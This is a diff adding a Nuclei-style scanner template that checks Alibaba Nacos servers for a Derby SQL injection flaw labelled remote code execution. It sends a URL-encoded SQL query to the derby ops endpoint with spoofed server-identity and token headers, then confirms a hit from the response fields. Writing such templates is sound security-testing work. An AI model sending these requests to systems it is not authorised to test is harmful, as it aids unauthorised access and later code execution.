@@ -1,0 +1,26 @@
+id: nacos-derby-sql-rce
+
+info:
+  name: Nacos Derby SQL Injection - Remote Code Execution
+  author: qwtd
+  severity: critical
+  tags: Alibaba-Nacos
+
+requests:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/nacos/v1/cs/ops/derby?sql=select%20%2A%20from%20%28SELECT%20%2A%20FROM%20SYS.SYSALIASES%20WHERE%20ALIASTYPE%20%3D%20%27F%27%29%20tmp%20%2F%2AROWS%20FETCH%20NEXT%2A%2F"
+      - "{{BaseURL}}/v1/cs/ops/derby?sql=select%20%2A%20from%20%28SELECT%20%2A%20FROM%20SYS.SYSALIASES%20WHERE%20ALIASTYPE%20%3D%20%27F%27%29%20tmp%20%2F%2AROWS%20FETCH%20NEXT%2A%2F"
+    headers:
+      User-Agent: Nacos-Server
+      serverIdentity: security
+      accessToken: 111
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - '"ALIAS"'
+          - '"JAVACLASSNAME"'
+          - '"ALIASID"'
+        condition: and
